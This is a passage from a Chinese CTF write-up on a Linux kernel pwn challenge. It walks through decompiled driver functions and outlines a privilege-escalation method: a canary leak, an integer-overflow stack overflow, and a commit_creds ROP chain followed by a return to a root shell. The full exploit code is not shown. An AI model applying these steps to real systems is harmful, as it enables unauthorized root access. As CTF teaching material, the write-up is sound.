class=&#34;line&#34;&gt;-initrd  ./rootfs.cpio \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-append &amp;quot;root=/dev/ram rw console=ttyS0 oops=panic panic=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; quiet kaslr&lt;span class=&#34;string&#34;&gt;&amp;quot; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-s  \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-nographic  \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;~                  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到这里开启了 kaslr 保护。&lt;/p&gt;
&lt;h2 id=&#34;2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2&#34;&gt;#&lt;/a&gt; 2.&lt;/h2&gt;
&lt;h3 id=&#34;canary&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#canary&#34;&gt;#&lt;/a&gt; canary&lt;/h3&gt;
&lt;p&gt;core.ko 开启了 canary，我们需要泄露他，进而构造 rop&lt;/p&gt;
&lt;h3 id=&#34;kaslr&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kaslr&#34;&gt;#&lt;/a&gt; kaslr&lt;/h3&gt;
&lt;p&gt;kaslr 类似与用户 pwn 的 aslr 或者 pie，一种地址偏移技术。如果我们可以获取 vmlinux_base 就可以绕过这个，执行其他函数。&lt;/p&gt;
&lt;p&gt;获取方式:head /proc/kallsyms 1,startup 对应的地址就是基址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/img_convert/8fbf9fb6608de56c46b546cc63017967.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;core_base&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#core_base&#34;&gt;#&lt;/a&gt; core_base&lt;/h3&gt;
&lt;p&gt;驱动加载地址，查看方式&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; /proc/modules&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; /proc/devices&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; /proc/kallsyms&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lsmod&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dmesg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/ &lt;span class=&#34;comment&#34;&gt;# lsmod&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;core 16384 0 - Live 0xffffffffc02aa000 (O)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;题目分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目分析&#34;&gt;#&lt;/a&gt; 题目分析&lt;/h2&gt;
&lt;p&gt;core.ko 就是我们需要利用的漏洞驱动&lt;/p&gt;
&lt;h3 id=&#34;core_ioctl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#core_ioctl&#34;&gt;#&lt;/a&gt; #core_ioctl&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;core_ioctl&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 fd, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx, __int64 user_buf)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//fd是设备对应的文件描述符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; ( idx )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x6677889B&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      core_read(user_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x6677889C&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      printk(&amp;amp;unk_2CD);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      off = user_buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x6677889A&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      printk(&amp;amp;unk_2B3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      core_copy_func(user_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据我们的传参实现三种功能， case 0x6677889C: 实现我们控制 off 全局变量&lt;/p&gt;
&lt;h3 id=&#34;core_read&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#core_read&#34;&gt;#&lt;/a&gt; core_read&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;core_read&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *v2; &lt;span class=&#34;comment&#34;&gt;// rdi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 i; &lt;span class=&#34;comment&#34;&gt;// rcx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-50h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 canary; &lt;span class=&#34;comment&#34;&gt;// [rsp+40h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  canary = __readgsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printk(&amp;amp;unk_25B);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printk(&amp;amp;unk_275);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;16LL&lt;/span&gt;; i; --i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *(_DWORD *)v2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v2 += &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(buf, &lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to the QWB CTF challenge.\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  result = copy_to_user(a1, &amp;amp;buf[off], &lt;span class=&#34;number&#34;&gt;64LL&lt;/span&gt;);   &lt;span class=&#34;comment&#34;&gt;// 栈任意地址读&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !result )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readgsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ canary;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __asm &amp;#123; swapgs &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;控制 off 后，我们就可一计算 buf 与 canary 的编译，然后通过 copy_to_user 将 canary 泄露出来。&lt;/p&gt;
&lt;h3 id=&#34;core_copy_func&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#core_copy_func&#34;&gt;#&lt;/a&gt; core_copy_func&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;core_copy_func&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 size)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _QWORD v2[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-50h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;] = __readgsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printk(&amp;amp;unk_215);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;gt; &lt;span class=&#34;number&#34;&gt;63&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printk(&amp;amp;unk_2A1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;0xFFFFFFFF&lt;/span&gt;LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    qmemcpy(v2, &amp;amp;name, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int16)size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;传入负数就可以绕过检查，然后实现对 v2 的溢出。&lt;/p&gt;
&lt;h3 id=&#34;core_write&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#core_write&#34;&gt;#&lt;/a&gt; core_write&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;core_write&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 a1, __int64 _buf, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 size)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printk(&amp;amp;unk_215);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( a3 &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x800&lt;/span&gt; &amp;amp;&amp;amp; !copy_from_user(&amp;amp;name, _buf, size) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printk(&amp;amp;unk_230);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;4294967282LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将数据写入内核全局变量 name 中。&lt;/p&gt;
&lt;p&gt;1、通过 /tmp/kallsyms 文件获得 commit_creds 函数与 prepare_kernel_cred 函数地址，并计算出所需 gadget 地址。2、对全局变量 off 赋值 0x40，通过 core_read 函数获得 canary 的值。3、构建好 ropchain，使用 core_write 函数将 ropchain 复制到内核态中 4、通过 core_copy_func 函数中的数值溢出造成的栈溢出漏洞，将 ropchain 放入栈中，退出函数时完成提权并返回用户态 getrootshell。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h2&gt;
&lt;p&gt;kernel rop 相较于用户态 rop 的不同点吧。在用户态中我们的目的是为了获得 shell，也就是令程序执行诸如 system (&amp;quot;/bin/sh&amp;quot;) 一类的函数，然而到了 kernel pwn 中我们的目的从原先的 getshell 变成了提权，也就是执行 commit_creds (prepare_kernel_cred (0)) 函数，并且执行完提权函数以后我们需要从内核态返回到用户态执行 system (&amp;quot;/bin/sh&amp;quot;) 获取 root 权限的 shell 才可以，所以在我看来 kernel rop 变得无非就是两步：执行提权函数，返回用户态获取 rootshell。从内核态返回用户态所需要用到的 swapgs 指令与 iretq 指令，前者是在从用户态进入内核态时，通过交换 IA32_KERNEL_GS_BASE 与 IA32_GS_BASE 值，从而得到 kernel 数据结构块，而从内核态变回用户态时需要将原先用户态的信息再交换回来。iretq 指令则用来恢复用户态的 cs、ss、rsp、rip、rflags 的信息。其具体布局如下所示：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;+-----------+			-----lower&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    RIP    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    CS     |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   rflags  |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    RSP    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|    SS     |			-----higher&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-----------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在计算内核 gadget 地址的时候我们使用 ropper 得到的 gadget 地址需要加上 offset 才是真实地址，这个和用户态的一样很好理解，而这个 offset 的获取办法，因为程序将函数地址导入到了 /tmp/kallsyms 中，我们我们可以 cat 出函数的真实地址，然后减去函数的 textoffset，就得到了 vmlinux_base. 而刚才所说的 offset 就是 vmlinux_base 减去 raw_vmlinux_base，即 0xffffffff81000000 的值。这题我们可以直接获取 start_up64&lt;/p&gt;
